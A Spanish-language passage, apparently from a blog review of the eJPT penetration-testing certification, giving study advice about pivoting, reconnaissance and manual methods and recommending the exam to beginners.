decirlo de alguna forma, el examen está dividido en dos partes, la anterior al pivoting y la posterior. En algún momento acabarás llegando a una parte en la que si no sabes pivotar o agregar rutas no podrás responder el resto de las preguntas. Echale un vistazo al enrutamiento y pivoting antes de empezar el examen :)Recomendaciones Crea una buena metodolgía. Lee todas las preguntas detenidamente. Recuerda que el reconocimiento es la base de todo. Toma nota de todo lo que encuentres. Intenta no utilizar herramientas automáticas como Metasploit, aprenderas más si haces las cosas manualmente. Recuerda que el examen no trata de encontrar flags.ConclusionesBajo mi experiencia puedo decir que recomendaría está certificación como la primera en caso de que este en un nivel junior o que no tengas aún otra certificación. Me ha parecido una muy buena primera experiencia con el tema de las certificaciones.Certificación eJPT" } ]
